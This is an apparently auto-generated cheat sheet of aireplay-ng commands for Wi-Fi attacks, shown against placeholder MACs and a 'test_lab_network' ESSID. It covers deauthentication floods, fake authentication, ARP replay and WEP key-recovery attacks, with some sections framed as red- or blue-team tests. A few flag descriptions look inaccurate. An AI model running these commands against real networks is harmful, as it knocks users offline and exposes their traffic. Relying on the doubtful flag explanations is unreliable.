# aireplay-ng

> Injects 802.11 frames: deauthentication, fake authentication and ARP replay to generate traffic or capture handshakes.

- Category: Wireless
- Commands: 55
- Page: https://terminal.rokibulroni.com/tool/wireless/aireplay-ng
- Homepage: https://www.aircrack-ng.org
- Documentation: https://www.aircrack-ng.org/doku.php?id=aireplay-ng
- Tags: Wi-Fi, packet injection, deauth

## Install

- apt: `sudo apt install aircrack-ng`

## Basic Syntax

### aireplay-ng --help

```bash
aireplay-ng --help
```

Displays the full help menu listing all available attack modes and command line options


## Injection Capability Test

### aireplay-ng -9 wlan0mon

```bash
aireplay-ng -9 wlan0mon
```

Performs a basic broadcast injection test to verify the card supports packet injection on the current channel

### aireplay-ng -9 -e test_lab_network -a 00:11:22:33:44:55 wlan0mon

```bash
aireplay-ng -9 -e test_lab_network -a 00:11:22:33:44:55 wlan0mon
```

Tests injection capabilities specifically against a designated Access Point and ESSID to verify reachability

### aireplay-ng -9 -i wlan1 -r wlan0mon

```bash
aireplay-ng -9 -i wlan1 -r wlan0mon
```

Performs a card-to-card injection test using one interface to attack and another to monitor responses


## Deauthentication

### aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Sends a single directed deauthentication packet to kick a specific client from an Access Point

### aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Sends a burst of 5 targeted deauthentication packets to ensure client disconnection for handshake capture

### aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

```bash
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

Initiates an infinite broadcast deauthentication loop against an Access Point to disconnect all associated clients

### aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -D wlan0mon

```bash
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -D wlan0mon
```

Sends deauthentication packets with the AP detection disabled to force packet transmission regardless of beacon presence

### aireplay-ng -0 0 -a 00:11:22:33:44:55 --ignore-negative-one wlan0mon

```bash
aireplay-ng -0 0 -a 00:11:22:33:44:55 --ignore-negative-one wlan0mon
```

Runs a continuous deauthentication attack while suppressing channel mismatch error messages


## Fake Authentication

### aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Performs a standard fake authentication attack to associate a specific MAC address with an Open Access Point

### aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 10 wlan0mon

```bash
aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 10 wlan0mon
```

Executes fake authentication with defined keep-alive packets and specific reassociation timing intervals

### aireplay-ng -1 6000 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -1 6000 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Performs fake authentication with a long re-authentication delay of 6000 seconds to maintain association quietly

### aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -y shared_key_stream.xor wlan0mon

```bash
aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -y shared_key_stream.xor wlan0mon
```

Attempts fake authentication against a WEP Shared Key network using a captured keystream file


## Interactive Packet Replay

### aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Starts interactive mode to select and replay specific packets flowing between an AP and a client

### aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -m 68 -n 86 wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -m 68 -n 86 wlan0mon
```

Filters and replays only packets matching specific minimum and maximum lengths to target ARP requests

### aireplay-ng -2 -b 00:11:22:33:44:55 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon
```

Interactively replays packets with a specific Frame Control field (0841) to generate IVs

### aireplay-ng -2 -r capture.cap -b 00:11:22:33:44:55 wlan0mon

```bash
aireplay-ng -2 -r capture.cap -b 00:11:22:33:44:55 wlan0mon
```

Extracts packets from a PCAP file and allows interactive selection for injection into the live network


## ARP Request Replay

### aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Listens for ARP requests and immediately replays them to generate new IVs rapidly

### aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 500 wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 500 wlan0mon
```

Executes an ARP replay attack while limiting the injection rate to 500 packets per second

### aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -j wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -j wlan0mon
```

Performs ARP replay injection mapping to create a merged capture file (arp-request)


## Chopchop Attack

### aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Executes the KoreK Chopchop attack to decrypt a WEP packet byte by byte without knowing the key

### aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -F wlan0mon

```bash
aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -F wlan0mon
```

Attempts the Chopchop attack but ignores the standard strategy filter to try on any packet


## Fragmentation Attack

### aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Launches a Fragmentation attack to obtain a PRGA (Pseudo Random Generation Algorithm) keystream

### aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.100 wlan0mon

```bash
aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.100 wlan0mon
```

Performs a Fragmentation attack targeting a specific destination IP to generate a valid keystream


## Cafe Latte Attack

### aireplay-ng -6 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -6 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Executes the Cafe Latte attack against a client to recover a WEP key by manipulating ARP requests


## Client-Oriented Fragmentation

### aireplay-ng -7 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -7 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Uses the Hirte attack against a client to recover WEP keystreams using fragmentation techniques


## WPA Migration Mode

### aireplay-ng -8 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -8 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Attacks WPA migration mode capable Access Points by sending WEP encapsulated broadcast ARP requests


## Injection Test

### aireplay-ng -9 -i wlan1 wlan0mon

```bash
aireplay-ng -9 -i wlan1 wlan0mon
```

Tests injection with a secondary card acting as the sniffer to validate the primary card's injection success


## Timing Control

### aireplay-ng -1 60 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -T 1 wlan0mon

```bash
aireplay-ng -1 60 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -T 1 wlan0mon
```

Performs fake authentication with retry logic set to exit immediately if the fake auth fails


## Red Team Simulation

### aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 4 wlan0mon

```bash
aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 4 wlan0mon
```

Sends deauthentication packets simulating specific reason code 4 (Disassociated due to inactivity) for stealth testing


## Purple Team Validation

### aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 10 wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 10 wlan0mon
```

Replays ARP requests at a very low rate of 10 pps to test if WIDS threshold alerts are triggered


## Blue Team Defense

### aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Sends a single deauth frame to validate if the defensive monitoring system logs the exact timestamp and source


## Packet Replay

### aireplay-ng -2 -r previous_attack.cap -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 0841 wlan0mon

```bash
aireplay-ng -2 -r previous_attack.cap -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 0841 wlan0mon
```

Replays specific frame types from a capture file to recreate a specific traffic signature


## Custom Packet Building

### aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -f 1 wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -f 1 wlan0mon
```

Interactively replays packets containing the fragmentation bit set


## Performance Tuning

### aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 1024 wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 1024 wlan0mon
```

Stresses the Access Point by replaying ARP requests at the maximum reliable rate of 1024 packets per second


## Output Logging

### aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF 2>&1 | tee fakeauth_log.txt

```bash
aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF 2>&1 | tee fakeauth_log.txt
```

Runs a fake authentication attack and pipes the standard output to a log file for audit records


## Automation Workflow

### timeout 60s aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon

```bash
timeout 60s aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

Uses the system timeout command to limit a broadcast deauthentication attack strictly to 60 seconds


## Complex Replay

### aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF -p 0000 wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF -p 0000 wlan0mon
```

Filters for management frames only (frame control 0000) for interactive replay selection


## PRGA Injection

### aireplay-ng -2 -r crafted_packet.cap -y keystream.xor wlan0mon

```bash
aireplay-ng -2 -r crafted_packet.cap -y keystream.xor wlan0mon
```

Injects a crafted packet from a file by encrypting it on the fly using a known PRGA keystream


## WIDS Evasion Test

### aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 1 wlan0mon

```bash
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 1 wlan0mon
```

Sends deauth packets with reason code 1 (Unspecified failure) to test how WIDS interprets generic disconnects


## Advanced Injection

### aireplay-ng -2 -b 00:11:22:33:44:55 -d AA:BB:CC:DD:EE:FF -m 100 -n 120 wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -d AA:BB:CC:DD:EE:FF -m 100 -n 120 wlan0mon
```

Targets packets within a specific size range (100-120 bytes) to identify and replay specific data flows


## Deauthentication

### aireplay-ng -0 30 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --ignore-negative-one wlan0mon

```bash
aireplay-ng -0 30 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --ignore-negative-one wlan0mon
```

Executes a persistent deauth attack for 30 counts ensuring compatibility across different driver channel reporting


## Fake Authentication

### aireplay-ng -1 10 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -Q wlan0mon

```bash
aireplay-ng -1 10 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -Q wlan0mon
```

Sends re-association requests periodically to a target AP with the 'Q' flag to send reassociation packets


## Defensive Stress Test

### aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 1 wlan0mon

```bash
aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 1 wlan0mon
```

Floods the AP with keep-alive packets every second to test the AP's resource handling and logging


## Attack Source Obfuscation

### aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:55 wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:55 wlan0mon
```

Performs ARP replay spoofing the AP's own MAC address as the source to test switch port security logic


## Incident Response Simulation

### aireplay-ng -0 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -0 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

Simulates a sustained denial of service attack on a VIP client to drill incident response triage procedures


## Shared Key Auth

### aireplay-ng -1 0 -e test_lab_network -y keystream.xor -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

```bash
aireplay-ng -1 0 -e test_lab_network -y keystream.xor -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

Uses a known PRGA XOR file to authenticate to a WEP AP protected by Shared Key Authentication


## Manual ARP Construction

### aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -r arp_packet.cap wlan0mon

```bash
aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -r arp_packet.cap wlan0mon
```

Replays an ARP request extracted specifically from a pcap file rather than listening for a new one


## Mass Deauthentication

### aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

```bash
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon
```

Broadcasts 5 deauthentication frames to the entire BSSID, forcing all clients to reconnect simultaneously


## Clean Up

### killall aireplay-ng

```bash
killall aireplay-ng
```

Terminates all running aireplay-ng processes to ensure the wireless interface is released


## Client Interaction Check

### aireplay-ng -9 -i wlan0mon wlan0mon

```bash
aireplay-ng -9 -i wlan0mon wlan0mon
```

Performs a self-test injection check to verify the interface can hear its own injected packets


## Fake Auth Picky Mode

### aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 1 wlan0mon

```bash
aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 1 wlan0mon
```

Engages fake authentication with packet control set to 1 (picky) to adjust behavior for stubborn APs


## Bit-Flip Attack

### aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.55 wlan0mon

```bash
aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.55 wlan0mon
```

Runs the Chopchop attack aiming to guess the keystream for a specific destination IP address


## Interactive Frame Selection

### aireplay-ng -2 -b 00:11:22:33:44:55 -t 1 wlan0mon

```bash
aireplay-ng -2 -b 00:11:22:33:44:55 -t 1 wlan0mon
```

Starts interactive replay but only selects packets with the 'ToDS' bit set to 1


## Final Verification

### aireplay-ng -9 -a 00:11:22:33:44:55 -i wlan1 wlan0mon

```bash
aireplay-ng -9 -a 00:11:22:33:44:55 -i wlan1 wlan0mon
```

Finalizes the workflow with a targeted injection test using a secondary monitor interface for confirmation

## Related tools

- [airodump-ng](https://terminal.rokibulroni.com/tool/wireless/airodump-ng)
- [Aircrack-ng](https://terminal.rokibulroni.com/tool/wireless/aircrack-ng)
